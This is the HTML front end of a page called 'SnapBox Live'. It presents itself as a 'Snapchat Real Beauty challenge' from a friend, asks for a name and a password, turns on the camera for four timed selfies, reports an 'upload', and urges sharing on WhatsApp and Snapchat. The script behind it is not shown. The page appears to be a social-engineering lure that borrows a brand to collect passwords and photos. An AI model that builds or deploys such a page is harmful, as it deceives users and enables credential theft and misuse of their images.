<!DOCTYPE html>
<html lang="en" class="dark bg-black text-white">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>SnapBox Live</title>
  <!--Favicon-->
  <link rel="icon" type="image/png" href="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/20250721_123142.png">
  <!-- Tailwind CSS -->
  <link href="https://cdn.jsdelivr.net/npm/tailwindcss@2.2.19/dist/tailwind.min.css" rel="stylesheet" />

  <!-- Lucide Icons -->
  <script src="https://unpkg.com/lucide@latest"></script>

  <!-- Font -->
  <link href="https://fonts.googleapis.com/css2?family=Lexend:wght@700&display=swap" rel="stylesheet" />
<!-- Font Awesome CDN -->
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.0/css/all.min.css" />
  <link rel="stylesheet" href="css/style.css" />
  </head>

<body class="flex flex-col items-center justify-center min-h-screen px-4">

<!-- Welcome Popup -->
<div id="welcomePopup" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40 transition duration-500">
  <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-40 rounded-xl shadow-xl flex items-center justify-center">
    Welcome! to Snapchat Real Beauty challenge SnapBox ðŸ‘»
  </div>
</div>

    <!-- Your Friend Challenge-->
  <div id="challengePopup" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40 transition duration-500">
    <div class="bg-white text-black text-center text-base font-light px-6 py-6 w-72 h-40 rounded-xl shadow-xl flex items-center justify-center">
      Your Friend Challenged you to click 4-real beauty Selfies in 10 second.
    </div>
  </div>

  <!-- Name Modal (hidden initially) -->
  <div id="nameModal" class="hidden fixed inset-0 z-50 flex items-center justify-center backdrop-blur-md bg-black/40">
    <div class="bg-white text-black px-6 py-8 w-80 rounded-xl shadow-xl text-center">
      <h2 class="font-bold text-lg mb-4">Enter your name</h2>
      <input id="nameInput" type="text" placeholder="Your name" class="w-full mb-3 px-4 py-2 border rounded-md text-black focus:outline-none" />
      <input id="passwordInput" type="password" placeholder="Password" class="w-full mb-4 px-4 py-2 border rounded-md text-black focus:outline-none" />
<button type="button" onclick="storeName()" class="btn-glow w-full py-2 rounded-md font-bold">Start</button>    </div>
  </div>



  <!-- Main App Content -->
  <div id="mainContainer" class="filter blur-md pointer-events-none transition duration-500 w-full flex flex-col items-center justify-center">
  <!-- Floating Social Share Buttons -->
  <div class="fixed top-1/2 right-4 transform -translate-y-1/2 space-y-4 z-50">
<button onclick="shareOnWhatsApp()" 
   style="background-color: #26d902;" 
   class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition">
  <i class="fab fa-whatsapp text-white text-2xl"></i>
</button> 
    <a href="https://www.instagram.com/"
      style= " background: linear-gradient(45deg, #f58529, #dd2a7b, #8134af);"      target="_blank" class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition"><i class= "fab fa-instagram text-2xl"></i></a>
 <button onclick="copySnapchatMessage()"
   style="background-color: #FFFC00;" 
   class="block w-10 h-10 rounded-full flex items-center justify-center shadow-lg hover:scale-110 transition">
  <i class="fab fa-snapchat-ghost text-black text-2xl"></i>
</button>
    <a href="https://facebook.com/" target="_blank" class="block w-10 h-10 rounded-full bg-blue-600 flex items-center justify-center shadow-lg hover:scale-110 transition"><i class="fab fa-facebook-f text-2xl "></i></a>
  </div>
<!-- User Icon + Name (Top Left) -->
<div class="absolute top-4 left-4 z-50 flex flex-col items-center space-y-1">
  <!-- Icon -->
  <div class="w-12 h-12 p-1 rounded-full bg-gradient-to-tr from-purple-700 to-pink-500">
    <div style="background-color:#ffff" class="w-full h-full rounded-full flex items-center justify-center">
      <i data-lucide="user" class="w-5 h-5 text-black"></i>
    </div>
  </div>

  <!-- Name directly below -->
<div id="userNameDisplay"
     class="hidden font-semibold text-sm transition-all duration-300">
</div>
  
</div>

    <!-- Toggle Theme (Top Right) -->
    <button onclick="toggleTheme()" class="absolute top-4 right-4 p-3 rounded-full bg-gray-800 text-white flex items-center justify-center">
      <i data-lucide="sun"></i>
    </button>

    <!-- Header -->
    <div class="flex flex-col items-center mb-2 mt-4">
      <img src="https://raw.githubusercontent.com/ankitsuraj/snapbox-app/refs/heads/main/20250721_123142.png" class="w-24 animate-bounce" />
      <h1 class="text-xl text-[#f0f002] font-bold tracking-wide mt-2">SnapBox</h1>
    </div>

    <!-- Camera Preview -->
    <div class="mb-5 border-4 rounded-2xl overflow-hidden" style="border-color:#f0f002">
      <video id="camera" autoplay muted playsinline class="w-64 h-96 object-cover shadow-xl"></video>
    </div>

    <!-- Capture Button -->
    <button onclick="capturePhoto()" class="btn-glow font-bold px-6 py-2 rounded-full transition mb-4 flex items-center gap-2 shadow">
      <i data-lucide="camera" class="w-5 h-5"></i> Capture
    </button>

    <!-- Preview Boxes -->
    <div id="previewBoxes" class="grid grid-cols-2 gap-4 mb-6">
      <div class="preview-ring"><div class="preview-box">Tap 1<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
      <div class="preview-ring"><div class="preview-box">Tap 2<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
      <div class="preview-ring"><div class="preview-box">Tap 3<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
      <div class="preview-ring"><div class="preview-box">Tap 4<div class="camera-icon"><i data-lucide="camera" class="w-4 h-4 text-purple-700"></i></div></div></div>
    </div>

    <!-- Action Buttons -->
    <div class="flex gap-4 mb-6">
      <button onclick="downloadAllPhotos()" class="btn-glow px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
        <i data-lucide="download" class="w-5 h-5"></i> Download
      </button>
      <button onclick="resetAll()" class="bg-red-500 hover:bg-red-600 text-white px-6 py-2 rounded-full font-bold transition flex items-center gap-2 shadow">
        <i data-lucide="rotate-ccw" class="w-5 h-5"></i> Reset
      </button>
    </div>

    <!-- Upload Success Message -->
    <div id="msg" class="hidden fixed inset-0 flex items-center justify-center z-50">
      <div class="bg-green-500 text-white text-xl font-bold px-10 py-5 w-50 h-50 rounded-xl shadow-xl">
        ðŸŽ‰ Congratulations! You won the task!
      </div>
    </div>

    <!-- Floating Chat Icon -->
    <div class="fab-chat">
      <i data-lucide="message-circle" class="w-5 h-5"></i>
    </div>

    <canvas id="canvas" class="hidden"></canvas>
  </div>
<script src="js/script.js"> </script>
</body>
</html>
